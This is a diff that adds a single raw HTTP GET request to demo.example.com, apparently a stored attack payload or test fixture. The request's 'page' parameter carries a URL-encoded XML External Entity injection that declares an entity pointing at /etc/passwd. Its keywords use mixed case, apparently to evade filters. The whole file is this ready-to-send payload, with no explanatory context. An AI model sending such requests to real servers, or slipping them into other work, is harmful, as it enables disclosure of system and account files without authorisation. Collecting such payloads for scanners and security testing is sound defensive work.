@@ -1,0 +1,4 @@
+GET /a?page=<!dOcTyPe%20R%20[<!eNtItY%20x%20PuBlIc%20"-//X//y"%20"FiLe:///EtC/pAsSwD">]><r>%26X;</r> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
